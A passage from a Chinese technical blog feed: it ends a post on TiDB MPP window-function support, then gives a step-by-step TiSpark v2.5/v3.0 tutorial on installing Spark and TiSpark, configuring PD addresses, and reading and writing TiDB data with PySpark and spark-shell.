<td style="text-align:center">5</td>
<td style="text-align:center">PERCENT_RANK()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">FIRST_VALUE()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">LAST_VALUE()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">NTH_VALUE()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">NTILE()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">LAG()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">LEAD()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">MEDIAN</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y(10.3.3)</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">PERCENTILE_CONT</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y(10.3.3)</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">PERCENTILE_DISC</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y(10.3.3)</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">cannot</td>
</tr>
</tbody>
</table>
<h2 id="总结">总结</h2>
<ol>
<li>通过将窗口函数下推到 MPP 计算框架，减轻 TiDB Server 的单点计算压力，将计算压力分摊到各个 TiFlash 节点，从而支持并行计算，提升查询性能。</li>
<li>对于 OLAP 业务，建议考虑将普通查询改写为窗口函数，以提升查询效率。</li>
<li>对于 TiDB v4.0 之前的老版本升级到新版本的场景，<code>tidb_enable_window_function</code> 参数会默认设为0，需要手动开启。<a class="link"   href="https://github.com/pingcap/tidb/issues/13866" >#13866 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>最后，希望在之后的版本中，MPP 架构可以支持更多的窗口函数。</li>
</ol>
<h2 id="References">References</h2>
<ul>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/window-functions" >窗口函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://tidb.net/blog/411fb363" >【TiDB 社区版主推荐阅读】SQL 窗口函数速查表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://tidb.net/blog/a523b8ec" >TiDB 3.0：窗口函数初体验 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/tidb/tidb-6.0-tispark-guide/#%E4%BD%BF%E7%94%A8-PySpark-%E6%BC%94%E7%A4%BA%E7%AA%97%E5%8F%A3%E5%87%BD%E6%95%B0">使用 PySpark 演示窗口函数</a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/421791" >https://www.modb.pro/db/421791 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/aafc201b?shareId=a380735e" >https://tidb.net/blog/aafc201b?shareId=a380735e <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/book/book-rush/performance/mpp-engine/mpp-window-functions" >https://tidb.net/book/book-rush/performance/mpp-engine/mpp-window-functions <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>tiflash</tag>
        <tag>mpp</tag>
        <tag>窗口函数</tag>
      </tags>
  </entry>
  <entry>
    <title>TiSpark v2.5 开发入门实践及 TiSpark v3.0.0 新功能解读</title>
    <url>/2022/tidb/tidb-6.0-tispark-guide/</url>
    <content><![CDATA[<h1>背景</h1>
<p>Spark 是一款专为大规模数据处理而设计的计算引擎，而 TiSpark 是基于 Spark 非侵入式的强化插件，可以很好的兼容 TiDB，并对 TiDB 中的数据进行处理分析。TiSpark 集成了 mysql-connector-java，可以从 TiKV 和 TiFlash 读取数据。并且，TiSpark 实现了 TiKV 的 Java 客户端，可以写入数据到 TiKV，而不用经过 TiDB Server。</p>
<p>本文将介绍如何安装配置 TiSpark v2.5，并演示如何用 Spark 客户端对 TiDB 中的数据进行读、写、删操作，以及调用窗口函数。</p>
<p>TiSpark v3.0.0 已于 6月15日正式发布，本文也将解读部分新功能。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/1-1655090475341.png"
                      referrerpolicy="no-referrer"
                >
<h1>TiSpark 安装</h1>
<h2 id="版本信息">版本信息</h2>
<p>TiSpark 需要配合 Spark 使用，而 Spark 是基于 Scala 开发的，Scala 依赖 JDK，故需要安装如下组件。</p>
<p>本文所涉及的各个组件及版本信息如下：</p>
<blockquote>
<p>TiDB 6.0.0</p>
<p>OpenJDK 1.8.0</p>
<p>Scala 2.13.8</p>
<p>Spark 3.0.3</p>
<p>TiSpark 2.5.0</p>
</blockquote>
<h2 id="组件安装">组件安装</h2>
<h3 id="TiDB">TiDB</h3>
<p>本文使用的是 TiDB 6.0，安装步骤略，查看数据库版本如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiDB-v6 [test] 00:37:25&gt; select tidb_version()\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">tidb_version(): Release Version: v6.0.0</span><br><span class="line">Edition: Community</span><br><span class="line">Git Commit Hash: 36a9810441ca0e496cbd22064af274b3be771081</span><br><span class="line">Git Branch: heads/refs/tags/v6.0.0</span><br><span class="line">UTC Build Time: 2022-03-31 10:33:28</span><br><span class="line">GoVersion: go1.18</span><br><span class="line">Race Enabled: false</span><br><span class="line">TiKV Min Version: v3.0.0-60965b006877ca7234adaced7890d7b029ed1306</span><br><span class="line">Check Table Before Drop: false</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="JDK">JDK</h3>
<p>安装过程省略，直接查看 JDK 版本信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ java -version</span><br><span class="line">openjdk version &quot;1.8.0_302&quot;</span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_302-b08)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.302-b08, mixed mode)</span><br></pre></td></tr></table></figure></div>
<h3 id="Scala">Scala</h3>
<p>直接从 Scala 官网下载 2.12 版本的 RPM 包，并进行安装。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://downloads.lightbend.com/scala/2.12.15/scala-2.12.15.rpm</span><br><span class="line">sudo yum install ./scala-2.12.15.rpm</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，查看 Scala 版本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala -version</span><br><span class="line">Scala code runner version 2.12.15 -- Copyright 2002-2021, LAMP/EPFL and Lightbend, Inc.</span><br></pre></td></tr></table></figure></div>
<h3 id="Spark">Spark</h3>
<p>从官网下载 Spark 3.0，解压后导入环境变量后，即可使用。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/spark/spark-3.0.3/spark-3.0.3-bin-hadoop2.7.tgz</span><br><span class="line">tar zxvf spark-3.0.3-bin-hadoop2.7.tgz</span><br><span class="line"></span><br><span class="line">vi ~/.bashrc</span><br><span class="line">export PATH=$PATH:~/spark-3.0.3-bin-hadoop2.7/bin</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure></div>
<h3 id="TiSpark">TiSpark</h3>
<blockquote>
<p>通过对接 Spark 的 Extension 接口，TiSpark 得以在不直接修改 Spark 源代码的前提下，深度订制 Spark SQL 的根本行为，包括加入算子，扩充语法，修改执行计划等等，让它看起来更像是一款 Spark 原生产品而非第三方扩展。</p>
</blockquote>
<p>TiSpark 的主要部件是 <code>tispark-assembly-x.x.x.jar</code> 这个 jar 包，获取方式有两种，一是直接使用 <code>tiup install tispark</code>，二是直接下载 Jar 包。此外，在实际Java项目开发中，可直接在 <code>pom.xml</code> 中引用 <a class="link"   href="https://asktug.com/t/topic/694149/3" >#694149 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。由于 TiSpark 2.5 尚未推送到 tiup mirror，故本文采用第二种方式。</p>
<p>通过 <code>tiup list</code> 可查看 tiup mirror 远端的 spark/tispark 版本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ tiup list spark</span><br><span class="line">Available versions for spark:</span><br><span class="line">Version  Installed  Release                    Platforms</span><br><span class="line">-------  ---------  -------                    ---------</span><br><span class="line">v2.4.3              2020-07-08T16:59:15+08:00  any/any</span><br><span class="line"></span><br><span class="line">shawnyan@centos7:~$ tiup list tispark</span><br><span class="line">Available versions for tispark:</span><br><span class="line">Version  Installed  Release                    Platforms</span><br><span class="line">-------  ---------  -------                    ---------</span><br><span class="line">v2.3.1              2020-07-09T15:59:03+08:00  any/any</span><br><span class="line">...</span><br><span class="line">v2.4.0              2021-04-16T15:07:02+08:00  any/any</span><br><span class="line">v2.4.1   YES        2021-05-17T15:17:01+08:00  any/any</span><br></pre></td></tr></table></figure></div>
<p>下载 <code>tispark-assembly-2.5.0.jar</code> 后，将其移动到 spark 的 jars 路径下，如此启动 spark 客户端时就无需显式引用。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/pingcap/tispark/releases/download/v2.5.0/tispark-assembly-2.5.0.jar</span><br><span class="line">mv tispark-assembly-2.5.0.jar spark-3.0.3-bin-hadoop2.7/jars/</span><br></pre></td></tr></table></figure></div>
<ul>
<li>未放到 jars 路径下，需要显式引用</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark-shell --jars tispark-assembly-2.5.0.jar</span><br></pre></td></tr></table></figure></div>
<ul>
<li>已放到 jars 路径下，则可直接运行</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark-shell</span><br></pre></td></tr></table></figure></div>
<p>启动 spark-shell 后，可以从 SparkContext WebUI 看到已经导入 TiSpark 的 jar 包。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2-1655090518068.png"
                      referrerpolicy="no-referrer"
                >
<h4 id="TiSpark-v3-0-0-启用-Jar-包新命名规则">TiSpark v3.0.0 启用 Jar 包新命名规则</h4>
<blockquote>
<p>TiSpark 的 Jar 包有了新的命名规则： <code>tispark-assembly-&#123;spark_version&#125;_&#123;scala_version&#125;-&#123;$tispark_verison&#125;</code> <a class="link"   href="https://github.com/pingcap/tispark/pull/2370" >#2370 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>这是一项兼容性修改，新命名规则为：<code>tispark-assembly-&#123;$spark_version&#125;_&#123;$scala_version&#125;-&#123;$tispark_verison&#125;</code>。Jar 包命名更加规范、清晰，用户可按需下载对应的 Jar 包。本次发版提供了三个 Jar 包，分别名为：</p>
<ul>
<li>tispark-assembly-3.0_2.12-3.0.0.jar</li>
<li>tispark-assembly-3.1_2.12-3.0.0.jar</li>
<li>tispark-assembly-3.2_2.12-3.0.0.jar</li>
</ul>
<p>TiSpark v3.0.0 支持 Scala 2.12，以及 Spark 3.0/3.1/3.2。本文使用 Spark 3.0，故这里需下载对应的 Jar 包，然后将其移动到 spark 的 jars 路径下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/pingcap/tispark/releases/download/v3.0.0/tispark-assembly-3.0_2.12-3.0.0.jar</span><br><span class="line">mv tispark-assembly-3.0_2.12-3.0.0.jar spark-3.0.3-bin-hadoop2.7/jars/</span><br></pre></td></tr></table></figure></div>
<h2 id="TiSpark-版本说明">TiSpark 版本说明</h2>
<p>下表为 TiSpark、Spark、Scala 的版本对应表，并标注了是否需要 pytispark。本文中的示例使用 TiSpark 2.5.0 和 TiSpark 3.0.0，故直接使用 pyspark 即可，推荐各位读者使用最新版本。</p>
<table>
<thead>
<tr>
<th>TiSpark 版本</th>
<th>Spark 版本</th>
<th>Scala 版本</th>
<th>是否需要 pytispark</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>&lt; 2.3</td>
<td></td>
<td>2.11</td>
<td>✅</td>
<td>支持 TiDB 4.0, 不再维护</td>
</tr>
<tr>
<td>2.4.x</td>
<td>2.3, 2.4</td>
<td>2.11, 2.12</td>
<td>pyspark ❎ spark-sumbit ✅</td>
<td>支持 TiDB 4.0, TiDB 5.0</td>
</tr>
<tr>
<td>2.5.x</td>
<td>3.0, 3.1</td>
<td>2.12</td>
<td>❎</td>
<td>支持 TiDB 4.0, TiDB 5.0</td>
</tr>
<tr>
<td>3.0.0</td>
<td>3.0, 3.1, 3.2</td>
<td>2.12</td>
<td>❎</td>
<td>支持 TiDB 4.0, TiDB 5.0</td>
</tr>
</tbody>
</table>
<p>注：</p>
<ol>
<li>从 TiSpark 2.4.0 开始支持 TiDB 5.0。</li>
<li>对于 TiDB 6.0，TiSpark 尚未完全支持，本文只是使用 TiDB 6.0 作为案例演示，而非生产环境中的实例。</li>
</ol>
<blockquote>
<p>TiSpark 还未进行全面的 TiDB 6 兼容性测试，其中一个已知问题就是未支持 new_collations，着急用可以先关闭此选项，大部分功能应该可以正常使用。new_collations 的支持在排期中，在支持后我们相应也会进行 TiDB 6 的兼容性测试，最后宣布支持 tidb 6。时间大概在7-8 月</p>
</blockquote>
<ol start="3">
<li>关于 pytispark 的 <a class="link"   href="https://github.com/pingcap/tispark/wiki/PySpark#%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8-pytispark" >官方阐释 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</li>
</ol>
<ul>
<li>在不支持 extension 的 Spark 2.3 之前，TiSpark 通过替换 Spark 类的方式来改变 Spark 执行计划。这带来了一个问题：当我们结合 TiSpark 和 Spark 周边工具使用时，还需要进行额外的适配工作。其中 pytispark 就是为 TiSpark 和 pyspark 结合使用而生。</li>
<li>Spark 2.3 之后推出了 extension ，TiSpark 抛弃了上述 hack 的方式转而使用 extension。理论上我们无需适配即可使用所有原生的 Spark 工具。但实际上，我们仍可能需 pytispark 来解决 SPARK-25003 带来的问题。需要明确的是，虽然同样是用了 pytispark ，但使用的目的是不一样的。</li>
<li>Spark 3.0 之后, SPARK-25003 已被解决，我们可以放心大胆的直接使用 pyspark 了。但由于 This session stuff logic is a bit convoluted and many session changes were made. I wouldn’t backport it from 3.0 to 2.x unless it’s quite serious one. 该 fix 并没有 back port 到 2.3 以及 2.4 版本。如果你想使用 pyspark 与 tispark, 建议使用 spark 3.0 及以上版本。</li>
</ul>
<h1>TiSpark 开发实践</h1>
<h2 id="TiSpark-v2-5-相关配置">TiSpark v2.5 相关配置</h2>
<p>TiSpark 依赖于 PD 组件，所以在 Spark 的配置文件中，需要配置 PD 地址。本例中，将配置信息写入到 spark/conf 路径下的 <code>spark-defaults.conf</code> 文件。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark.sql.extensions org.apache.spark.sql.TiExtensions</span><br><span class="line">spark.tispark.pd.addresses 192.168.8.101:2379</span><br><span class="line">spark.tispark.tidb.addr 192.168.8.101</span><br><span class="line">spark.tispark.tidb.port 4000</span><br><span class="line"></span><br><span class="line"># enable write through SparkSQL</span><br><span class="line">spark.tispark.write.allow_spark_sql true</span><br><span class="line"></span><br><span class="line"># enable `Catalog` provided by `spark-3.0`.</span><br><span class="line">spark.sql.catalog.tidb_catalog org.apache.spark.sql.catalyst.catalog.TiCatalog</span><br><span class="line">spark.sql.catalog.tidb_catalog.pd.addresses 192.168.8.101:2379</span><br></pre></td></tr></table></figure></div>
<p>注：</p>
<ol>
<li>实际使用时，建议将三个 pd 的地址都填写到 <code>pd.addresses</code> 配置项，本文为便于演示，只写了其中一个地址。</li>
<li>这里要确保开启 <code>spark.tispark.write.allow_spark_sql</code>，才能将数据写入 TiKV。</li>
</ol>
<p>启动 spark-shell 后，可通过 WebUI 看到生效的 Spark 配置项。</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3-1655090526272.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="TiSpark-v3-0-0-相关配置">TiSpark v3.0.0 相关配置</h3>
<blockquote>
<p>不再支持不使用 catalog 的方式。现在你必须配置 catalog 并使用 tidb_catalog <a class="link"   href="https://github.com/pingcap/tispark/pull/2252" >#2252 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>解读：从 TiSpark v3.0.0 开始，配置项中必须启动下面两项，上文的案例中已启用这一配置，继续按上文示例使用即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark.sql.extensions  org.apache.spark.sql.TiExtensions</span><br><span class="line">spark.tispark.pd.addresses  $&#123;your_pd_adress&#125;</span><br></pre></td></tr></table></figure></div>
<p>环境准备好之后，接下来将演示如何进行数据读取和写入。</p>
<h2 id="使用-PySpark-进行数据读取">使用 PySpark 进行数据读取</h2>
<p>首先演示如何使用 PySpark 读取 TiDB 中的数据。PySpark 是 Python 编写的 Spark 接口，可以调用 Python API 对 Spark 程序进行读写操作，并且可以进行数据分析。</p>
<h3 id="安装-PySpark">安装 PySpark</h3>
<p>这里主要介绍两种 pyspark 的安装方式：</p>
<ol>
<li>Spark 自带，所以无需另行安装。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ which pyspark</span><br><span class="line">~/spark-3.0.3-bin-hadoop2.7/bin/pyspark</span><br><span class="line"></span><br><span class="line">shawnyan@centos7:~$ pyspark --version</span><br><span class="line">Welcome to</span><br><span class="line">      ____              __</span><br><span class="line">     / __/__  ___ _____/ /__</span><br><span class="line">    _\ \/ _ \/ _ `/ __/  &#x27;_/</span><br><span class="line">   /___/ .__/\_,_/_/ /_/\_\   version 3.0.3</span><br><span class="line">      /_/</span><br><span class="line">                        </span><br><span class="line">Using Scala version 2.12.10, OpenJDK 64-Bit Server VM, 1.8.0_332</span><br><span class="line">Branch HEAD</span><br><span class="line">Compiled by user ubuntu on 2021-06-17T04:52:32Z</span><br><span class="line">Revision 65ac1e75dc468f53fc778cd2ce1ba3f21067aab8</span><br><span class="line">Url https://github.com/apache/spark</span><br><span class="line">Type --help for more information.</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>使用 pip 进行安装。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ pip3 install pyspark --user</span><br><span class="line">Collecting pyspark</span><br><span class="line">  Using cached https://files.pythonhosted.org/packages/f4/65/41eb22b7b4623d9f4560526cc456cb6425770c098a9dff6763111c4455cc/pyspark-3.2.1.tar.gz</span><br><span class="line">Collecting py4j==0.10.9.3 (from pyspark)</span><br><span class="line">  Using cached https://files.pythonhosted.org/packages/5e/e6/68db58a1d94d41ae042400f7965ed6a2c30e4108f77b54672d6451f86ebd/py4j-0.10.9.3-py2.py3-none-any.whl</span><br><span class="line">Installing collected packages: py4j, pyspark</span><br><span class="line">  Running setup.py install for pyspark ... done</span><br><span class="line">Successfully installed py4j-0.10.9.3 pyspark-3.2.1</span><br></pre></td></tr></table></figure></div>
<p>由此也可看出，PySpark 是借助 Py4j 实现 Python 调用 Java 来驱动 Spark 应用程序，其本质主要还是 JVM runtime，Java 到 Python 的结果返回是通过本地 Socket 完成。</p>
<h3 id="启动-PySpark">启动 PySpark</h3>
<p>启动 PySpark 时，可通过 <code>spark.driver.host</code> 配置项指定 IP，启动后，可通过该 IP 访问 WebUI 页面，在页面上可以直观的看到 Spark 配置项及计算结果。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyspark --conf spark.driver.host=&#x27;192.168.8.101&#x27;</span><br></pre></td></tr></table></figure></div>
<h3 id="查看-PySpark-版本信息">查看 PySpark 版本信息</h3>
<p>在交互式客户端查看 PySpark 的版本信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;pyspark &quot;+str(sc.version))</span><br><span class="line">pyspark 3.0.3</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; import pyspark</span><br><span class="line">&gt;&gt;&gt; print(&quot;pyspark&quot;,pyspark.__version__)</span><br><span class="line">(&#x27;pyspark&#x27;, &#x27;3.0.3&#x27;)</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-PySpark-通过-JDBC-读取数据">使用 PySpark 通过 JDBC 读取数据</h3>
<p>本例将演示如何通过 JDBC 读取 TiDB 中的数据。</p>
<ol>
<li>在 TiDB 中创建基础数据，创建表 t1, t2。</li>
</ol>
<ul>
<li>基础数据如下：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t1 (id int, col char(1));</span><br><span class="line">insert t1 select 1,&#x27;a&#x27;;</span><br><span class="line">create table t2(id int, col char(2));</span><br><span class="line">insert t2 select 2,&#x27;b&#x27;;</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>创建一个 Spark 连接</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pyspark.sql import SparkSession</span><br><span class="line">spark = SparkSession \</span><br><span class="line">        .Builder() \</span><br><span class="line">        .appName(&#x27;sql&#x27;) \</span><br><span class="line">        .master(&#x27;local&#x27;) \</span><br><span class="line">        .getOrCreate()</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>设置 JDBC 连接信息，<code>dbtable</code> 是指预读取的表名。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">url = &quot;jdbc:mysql://192.168.8.101:4000/test?user=root&amp;password=&amp;useSSL=false&amp;rewriteBatchedStatements=true&quot;</span><br><span class="line">df=spark.read.format(&quot;jdbc&quot;).options(url=url,</span><br><span class="line">  driver=&quot;com.mysql.jdbc.Driver&quot;,</span><br><span class="line">  dbtable=&quot;t1&quot;</span><br><span class="line">  ).load()</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>按条件 <code>id=1</code> 过滤，并显示结果。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; df.filter(df.id == 1).show()</span><br><span class="line">+---+---+</span><br><span class="line">| id|col|</span><br><span class="line">+---+---+</span><br><span class="line">|  1|  a|</span><br><span class="line">+---+---+</span><br></pre></td></tr></table></figure></div>
<ol start="5">
<li>按 id 列进行分组统计，并显示结果。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; countById = df.groupBy(&quot;id&quot;).count()</span><br><span class="line">&gt;&gt;&gt; countById.show()</span><br><span class="line">+---+-----+</span><br><span class="line">| id|count|</span><br><span class="line">+---+-----+</span><br><span class="line">|  1|    1|</span><br><span class="line">+---+-----+</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-spark-shell-进行数据写入">使用 spark-shell 进行数据写入</h2>
<p>接下来，演示如何使用 spark-shell 写入数据到 TiDB。</p>
<h3 id="启动-spark-shell">启动 spark-shell</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark-shell --conf spark.driver.host=&#x27;192.168.8.101&#x27;</span><br></pre></td></tr></table></figure></div>
<h3 id="查看-spark-shell-信息">查看 spark-shell 信息</h3>
<p>查看 spark 和 tispark 版本信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; org.apache.spark.SPARK_VERSION</span><br><span class="line">res0: String = 3.0.3</span><br><span class="line"></span><br><span class="line">scala&gt; spark.sql(&quot;select ti_version()&quot;).collect</span><br><span class="line">res0: Array[org.apache.spark.sql.Row] = </span><br><span class="line">Array([Release Version: 2.5.0</span><br><span class="line">Git Commit Hash: e48b484f7f8e5a3b70cdd8294fecfdb92fcdd411</span><br><span class="line">Git Branch: release-2.5</span><br><span class="line">UTC Build Time: 2022-01-27 09:13:04</span><br><span class="line">Supported Spark Version: 3.0 3.1</span><br><span class="line">Current Spark Version: 3.0.3</span><br><span class="line">Current Spark Major Version: 3.0</span><br><span class="line">TimeZone: Asia/Shanghai])</span><br></pre></td></tr></table></figure></div>
<p>从以上信息可知，当前 TiSpark 的代码取自分支 <code>release-2.5</code>，由此可快速定位到对应版本的源码：<a class="link"   href="https://github.com/pingcap/tispark/commit/e48b484f7f8e5a3b70cdd8294fecfdb92fcdd411" >e48b484 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="使用-spark-shell-写入数据">使用 spark-shell 写入数据</h3>
<ol>
<li>定义 SparkConf，配置 pd/tidb 地址和端口。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.spark.SparkConf</span><br><span class="line"></span><br><span class="line">val sparkConf = new SparkConf().</span><br><span class="line">  setIfMissing(&quot;spark.master&quot;, &quot;local[*]&quot;).</span><br><span class="line">  setIfMissing(&quot;spark.app.name&quot;, getClass.getName).</span><br><span class="line">  setIfMissing(&quot;spark.sql.extensions&quot;, &quot;org.apache.spark.sql.TiExtensions&quot;).</span><br><span class="line">  setIfMissing(&quot;spark.tispark.pd.addresses&quot;, &quot;192.168.8.101:2379&quot;).</span><br><span class="line">  setIfMissing(&quot;spark.tispark.tidb.addr&quot;, &quot;tidb&quot;).</span><br><span class="line">  setIfMissing(&quot;spark.tispark.tidb.port&quot;, &quot;4000&quot;)</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>配置好必要的依赖以后，初始化一个 SparkSession 对象。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.spark.sql.SparkSession</span><br><span class="line"></span><br><span class="line">val spark = SparkSession.builder.config(sparkConf).getOrCreate()</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>查看当前 t1 表中的数据量。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark.sql(&quot;use tidb_catalog&quot;)</span><br><span class="line"></span><br><span class="line">spark.sql(&quot;select count(*) from test.t1&quot;).show()</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>查询 t2 表中的数据，并将数据追加到 t1 表。</li>
</ol>
